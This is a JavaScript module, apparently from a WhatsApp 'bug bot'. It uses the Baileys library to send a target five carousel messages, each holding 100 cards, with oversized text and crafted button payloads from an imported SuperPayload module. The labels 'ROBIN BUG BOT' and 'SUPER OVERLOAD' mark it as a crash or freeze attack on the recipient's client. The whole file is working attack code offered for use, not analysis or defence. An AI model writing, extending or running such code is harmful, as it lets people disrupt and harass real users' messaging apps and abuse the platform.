
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload, getButtonPayload } = require('./SuperPayload');

async function Xdelay(SYxS7, target) {
    const totalPushes = 5;
    
    for (let i = 0; i < totalPushes; i++) {
        const push = [];
        for (let k = 0; k < 100; k++) {
            push.push({
                body: {
                    text: getSuperPayload(2000)
                },
                footer: {
                    text: 'ROBIN BUG BOT'
                },
                header: {
                    title: '🚩 SUPER OVERLOAD ',
                    hasMediaAttachment: false
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'single_select',
                            buttonParamsJson: getButtonPayload()
                        }
                    ],
                },
            });
        }

        const carousel = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: false,
                },
                body: {
                    text: getSuperPayload(1000),
                },
                footer: {
                    text: 'Trash Superior',
                },
                carouselMessage: {
                    cards: [...push],
                },
            }
        }, {
            userJid: target
        });

        try {
            await SYxS7.relayMessage(target, {
                groupStatusMessageV2: {
                    message: carousel.message
                }
            }, {
                messageId: carousel.key.id,
                participant: {
                    jid: target
                },
            });
            await new Promise(res => setTimeout(res, 1000));
        } catch (error) {
            console.log(`[ 🗑️ ] Error: ${error.message}`);
        }
    }
}

module.exports = { Xdelay };
